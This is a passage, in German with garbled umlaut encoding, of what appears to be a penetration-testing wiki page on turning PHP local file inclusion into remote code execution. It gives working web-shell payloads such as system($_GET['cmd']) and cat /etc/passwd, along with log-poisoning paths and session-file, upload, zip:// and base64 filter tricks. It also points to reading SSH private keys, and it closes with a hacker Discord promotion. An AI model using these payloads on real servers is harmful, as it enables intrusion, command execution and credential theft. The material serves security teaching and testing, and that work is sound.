Beachten Sie, dass **wenn Sie doppelte Anf√ºhrungszeichen** f√ºr die Shell anstelle von **einfachen Anf√ºhrungszeichen** verwenden, die doppelten Anf√ºhrungszeichen f√ºr den String "_**quote;**_" modifiziert werden, **PHP wird dort einen Fehler werfen** und **nichts anderes wird ausgef√ºhrt**.

Stellen Sie au√üerdem sicher, dass Sie die Payload **korrekt schreiben**, da PHP jedes Mal einen Fehler ausl√∂st, wenn es versucht, die Protokolldatei zu laden, und Sie keine zweite Gelegenheit haben werden.
{% endhint %}

Dies k√∂nnte auch in anderen Protokollen durchgef√ºhrt werden, aber **seien Sie vorsichtig**, der Code in den Protokollen k√∂nnte URL-codiert sein und dies k√∂nnte die Shell zerst√∂ren. Der Header **Authorization "basic"** enth√§lt "Benutzer:Passwort" in Base64 und wird in den Protokollen decodiert. Die PHPShell k√∂nnte in diesen Header eingef√ºgt werden.\
Andere m√∂gliche Protokollpfade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing-Wortliste: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### √úber E-Mail

**Senden Sie eine E-Mail** an ein internes Konto (user@localhost) mit Ihrem PHP-Payload wie `<?php echo system($_REQUEST["cmd"]); ?>` und versuchen Sie, die E-Mail des Benutzers mit einem Pfad wie **`/var/mail/<BENUTZERNAME>`** oder **`/var/spool/mail/<BENUTZERNAME>`** einzuschlie√üen.

### √úber /proc/\*/fd/\*

1. Laden Sie viele Shells hoch (zum Beispiel: 100).
2. Schlie√üen Sie [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) ein, wobei $PID = PID des Prozesses (kann erzwungen werden) und $FD der Dateideskriptor (kann ebenfalls erzwungen werden).

### √úber /proc/self/environ

Wie eine Protokolldatei, senden Sie das Payload im User-Agent, es wird innerhalb der Datei /proc/self/environ reflektiert.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### √úber Upload

Wenn Sie eine Datei hochladen k√∂nnen, f√ºgen Sie einfach das Shell-Payload ein (z. B.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, in die Metadaten der Bilder/Dokumente/PDFs einzuspeisen

### √úber Zip-Datei-Upload

Laden Sie eine ZIP-Datei hoch, die eine komprimierte PHP-Shell enth√§lt, und greifen Sie darauf zu:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### √úber PHP-Sitzungen

√úberpr√ºfen Sie, ob die Website PHP-Sitzungen (PHPSESSID) verwendet.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese Sitzungen in Dateien unter _/var/lib/php5/sess\\_\[PHPSESSID]\_ gespeichert.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Verwenden Sie die LFI, um die PHP-Sitzungsdatei einzuschlie√üen.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### √úber ssh

Wenn ssh aktiv ist, √ºberpr√ºfen Sie, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuchen Sie auf **\<HOME>/.ssh/id\_rsa** zuzugreifen.

### √úber **vsftpd** _**Protokolle**_

Die Protokolle f√ºr den FTP-Server vsftpd befinden sich unter _**/var/log/vsftpd.log**_. In dem Szenario, in dem eine lokale Dateieinschlie√üungs (LFI) Schwachstelle besteht und der Zugriff auf einen freigelegten vsftpd-Server m√∂glich ist, k√∂nnen die folgenden Schritte in Betracht gezogen werden:

1. F√ºgen Sie ein PHP-Payload in das Benutzernamenfeld w√§hrend des Anmeldevorgangs ein.
2. Nach der Injektion verwenden Sie die LFI, um die Serverprotokolle von _**/var/log/vsftpd.log**_ abzurufen.

### √úber php base64 Filter (unter Verwendung von base64)

Wie in [diesem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Artikel gezeigt, ignoriert der PHP base64 Filter einfach Nicht-Base64. Sie k√∂nnen das verwenden, um die Dateierweiterungspr√ºfung zu umgehen: Wenn Sie base64 bereitstellen, das mit ".php" endet, ignoriert es einfach den "." und f√ºgt "php" an das base64 an. Hier ist ein Beispiel-Payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### √úber php-Filter (keine Datei erforderlich)

Dieser [**Bericht**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)erkl√§rt, dass Sie **php-Filter verwenden k√∂nnen, um beliebige Inhalte zu generieren**. Das bedeutet im Grunde genommen, dass Sie **beliebigen php-Code generieren k√∂nnen**, um ihn in das Include **einzuf√ºgen, ohne ihn in eine Datei schreiben zu m√ºssen**.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### √úber Segmentation Fault

**Laden** Sie eine Datei hoch, die vor√ºbergehend in `/tmp` gespeichert wird, l√∂sen Sie dann im **selben Request** einen **Segmentation Fault** aus, und die **vor√ºbergehende Datei wird nicht gel√∂scht**, sodass Sie danach suchen k√∂nnen.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### √úber Nginx-Temp-Dateispeicher

Wenn Sie eine **Local File Inclusion** gefunden haben und **Nginx** vor PHP l√§uft, k√∂nnten Sie mit der folgenden Technik RCE erhalten:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### √úber PHP\_SESSION\_UPLOAD\_PROGRESS

Wenn Sie eine **Local File Inclusion** gefunden haben, auch wenn Sie **keine Sitzung haben** und `session.auto_start` auf `Aus` steht. Wenn Sie die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten bereitstellen, wird PHP die Sitzung f√ºr Sie **aktivieren**. Sie k√∂nnten dies missbrauchen, um RCE zu erhalten:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### √úber tempor√§re Datei-Uploads in Windows

Wenn Sie eine **Local File Inclusion** gefunden haben und der Server unter **Windows** l√§uft, k√∂nnten Sie RCE erhalten:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### √úber phpinfo() (file\_uploads = on)

Wenn Sie eine **Local File Inclusion** gefunden haben und eine Datei, die **phpinfo()** mit file\_uploads = on freigibt, k√∂nnen Sie RCE erhalten:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### √úber compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Pfadoffenlegung

Wenn Sie eine **Local File Inclusion** gefunden haben und den Pfad der tempor√§ren Datei **exfiltrieren k√∂nnen**, der **Server** jedoch √ºberpr√ºft, ob die **einzuschlie√üende Datei PHP-Markierungen hat**, k√∂nnen Sie versuchen, diese √úberpr√ºfung mit diesem **Race Condition** zu **umgehen**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### √úber ewiges Warten + Brute Force

Wenn Sie die LFI missbrauchen k√∂nnen, um **vor√ºbergehende Dateien hochzuladen** und den Server die PHP-Ausf√ºhrung **anh√§ngen** zu lassen, k√∂nnten Sie dann **Stunden damit verbringen, Dateinamen zu erraten**, um die vor√ºbergehende Datei zu finden:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Zu einem Fatal Error

Wenn Sie eine der Dateien `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` einf√ºgen. (Sie m√ºssen dieselbe Datei zweimal einf√ºgen, um diesen Fehler auszul√∂sen).

**Ich wei√ü nicht, wie das n√ºtzlich ist, aber es k√∂nnte sein.**\
_Selbst wenn Sie einen PHP Fatal Error verursachen, werden tempor√§re PHP-Dateien gel√∂scht._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referenzen

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounty-Starts und wichtigen Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!
